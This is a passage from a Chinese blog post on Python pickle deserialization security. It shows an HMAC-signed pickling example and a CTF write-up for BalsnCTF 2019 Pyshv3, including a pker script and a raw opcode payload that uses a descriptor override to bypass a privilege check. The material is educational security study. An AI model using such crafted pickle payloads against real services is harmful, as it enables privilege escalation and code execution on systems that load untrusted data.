&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>这次的find_class()没有变化，但是structs有具体的实现&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>而这个self.user.privileged在一开始就被设为了False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm 这怎么绕过捏？&lt;/p>
&lt;p>先说非预期，将&lt;code>__builtins__&lt;/code>复制到modules属性上；再说说预期解。&lt;/p>
&lt;p>我们知道，有&lt;code>__get__&lt;/code>，&lt;code>__set__&lt;/code>这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，&lt;code>a.x&lt;/code>的查找顺序是&lt;code>a.__dict__['x']&lt;/code>，之后&lt;code>type(a).__dict__['x']&lt;/code>，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">什么是描述符（descriptor）&lt;/a>）&lt;/p>
&lt;p>我们利用描述器的特性，将User类的&lt;code>__set__&lt;/code>方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发&lt;code>__set__&lt;/code>，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。&lt;/p>
&lt;hr>
&lt;p>从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。&lt;/p>
&lt;p>自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT&lt;/p>
&lt;hr>
&lt;p>最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python 反序列化漏洞学习笔记&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 Python 反序列化漏洞&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickle反序列化初探&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle 反序列化实例分析&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python 反序列化安全问题（一）&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python 反序列化安全问题（二）&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp;amp; 不用reduce的RCE姿势&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">关于Python sec的一些简单的总结&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">🐍 Security Issues in Python Pickle&lt;/a>&lt;/p></description></item></channel></rss>